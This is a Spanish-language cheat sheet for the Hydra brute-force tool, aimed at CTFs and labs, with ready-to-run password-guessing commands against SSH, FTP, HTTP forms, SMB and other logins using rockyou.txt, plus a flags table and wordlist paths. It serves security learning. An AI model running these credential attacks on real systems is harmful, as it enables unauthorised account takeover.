# 🔨 HYDRA - Brute Force Tool

> Herramienta de fuerza bruta para autenticación en red.  
> Soporta múltiples protocolos: SSH, FTP, HTTP, SMB, RDP, y más.

---

## ⚡ Flujo típico en un CTF / Lab

```
1. Identificar servicio     →  nmap (puerto + versión)
2. Enumerar usuarios        →  /etc/passwd, web, FTP anónimo, metadatos
3. Ataque con usuario fijo  →  hydra -l usuario -P rockyou.txt
4. Ataque sin usuario       →  hydra -L usuarios.txt -P rockyou.txt (lento)
5. Guardar resultado        →  -o resultado.txt
```

---

## 🔧 Comandos habituales

```bash
# SSH con usuario conocido
hydra -l juan -P /usr/share/wordlists/rockyou.txt ssh://192.168.0.10 -t 4

# SSH sin usuario (lista de usuarios)
hydra -L /usr/share/wordlists/metasploit/unix_users.txt -P /usr/share/wordlists/rockyou.txt ssh://192.168.0.10 -t 4

# FTP
hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://192.168.0.10

# HTTP POST login
hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.0.10 http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"

# HTTP Basic Auth
hydra -l admin -P /usr/share/wordlists/rockyou.txt http-get://192.168.0.10/admin

# SMB
hydra -l administrator -P /usr/share/wordlists/rockyou.txt smb://192.168.0.10

# Guardar resultado
hydra -l blue -P /usr/share/wordlists/rockyou.txt ssh://192.168.0.10 -t 4 -o resultado.txt
```

---

## 🚩 Flags principales

| Flag | Descripción |
|------|-------------|
| `-l usuario` | Usuario fijo |
| `-L lista.txt` | Lista de usuarios |
| `-p password` | Password fija |
| `-P lista.txt` | Lista de passwords |
| `-t 4` | Tareas paralelas (4 recomendado para SSH) |
| `-t 16` | 16 tareas (para FTP/HTTP, más rápido) |
| `-f` | Para al encontrar primera credencial válida |
| `-F` | Para en todos los hosts al encontrar una |
| `-v` | Verbose — ver intentos en tiempo real |
| `-V` | Muy verbose — ver cada intento |
| `-o archivo` | Guardar resultados en archivo |
| `-s puerto` | Puerto personalizado |
| `-e nsr` | Probar: n=vacío, s=usuario=pass, r=inverso |

---

## 📋 Protocolos soportados

| Protocolo | Ejemplo |
|-----------|---------|
| SSH | `ssh://192.168.0.10` |
| FTP | `ftp://192.168.0.10` |
| HTTP GET | `http-get://192.168.0.10/ruta` |
| HTTP POST | `http-post-form` |
| SMB | `smb://192.168.0.10` |
| RDP | `rdp://192.168.0.10` |
| MySQL | `mysql://192.168.0.10` |
| PostgreSQL | `postgres://192.168.0.10` |
| Telnet | `telnet://192.168.0.10` |

---

## 📁 Wordlists útiles en Kali

```bash
# La más usada en CTFs
/usr/share/wordlists/rockyou.txt

# Lista de usuarios comunes
/usr/share/wordlists/metasploit/unix_users.txt

# Más wordlists
/usr/share/wordlists/
/usr/share/seclists/         # si tienes SecLists instalado
```

---

## ⚠️ Notas importantes

- SSH: usar siempre `-t 4` — más tareas paralelas puede bloquear el servicio
- Si SSH bloquea conexiones, espera unos minutos o reinicia la máquina del lab
- Hydra **para automáticamente** al encontrar credencial válida
- En CTFs: **enumerar primero**, fuerza bruta como último recurso
- La salida en verde `[22][ssh]` indica credencial encontrada

---

## 🔗 Referencias

- GitHub oficial: https://github.com/vanhauser-thc/thc-hydra
- SecLists (wordlists): https://github.com/danielmiessler/SecLists